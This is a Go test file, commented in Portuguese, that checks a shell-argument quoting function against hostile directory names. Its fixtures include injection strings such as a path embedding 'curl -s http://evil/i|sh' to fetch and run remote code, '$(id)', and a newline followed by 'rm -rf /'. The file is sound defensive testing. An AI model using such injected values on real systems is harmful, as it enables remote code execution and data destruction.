package check

import (
	"os/exec"
	"strings"
	"testing"
)

// O caso reproduzido pela revisão: um diretório cujo NOME é um comando.
func TestArgNeutralizaCaminhoQueEhComando(t *testing.T) {
	hostis := []string{
		`/tmp/.x;curl -s http://evil/i|sh;#`,
		"/tmp/$(id)",
		"/tmp/`id`",
		`/tmp/a"b`,
		`/tmp/a'b`,
		"/tmp/a b",
		"/tmp/x\nrm -rf /",
		"/tmp/&&id",
		"/home/app/x;curl evil|sh;#/.git",
	}
	for _, p := range hostis {
		q := Arg(p)
		// A prova é o SHELL, não a inspeção: pedimos ao /bin/sh que imprima o
		// argumento e conferimos que ele chegou inteiro e sozinho.
		out, err := exec.Command("/bin/sh", "-c", "printf %s "+q).Output()
		if err != nil {
			t.Errorf("%q → %s: o shell recusou (%v)", p, q, err)
			continue
		}
		if string(out) != p {
			t.Errorf("%q → %s: o shell entendeu %q", p, q, out)
		}
	}
}

// E o caminho comum não ganha aspas: o relatório continua legível.
func TestArgNaoEnfeiaOCaminhoComum(t *testing.T) {
	for _, p := range []string{"/usr/sbin/nginx", "/tmp/.x", "/etc/cron.d/app", "198.51.100.241"} {
		if got := Arg(p); got != p {
			t.Errorf("Arg(%q) = %q — caminho comum não precisa de aspas", p, got)
		}
	}
	if Arg("") != "''" {
		t.Errorf("vazio precisa virar '' explícito, senão o comando perde um argumento")
	}
}

// A invariante que impede a regressão: nenhum passo seguinte pode conter um
// metacaractere de shell FORA de aspas simples.
func TestNenhumPassoSeguinteTemMetacaractereSolto(t *testing.T) {
	// Um caminho hostil que passa por Arg não deixa metacaractere solto.
	linha := "sudo cp " + Arg(`/tmp/.x;id`) + ` "$IR/"`
	if strings.Contains(strings.SplitN(linha, "'", 2)[0], ";") {
		t.Errorf("metacaractere fora das aspas: %s", linha)
	}
}
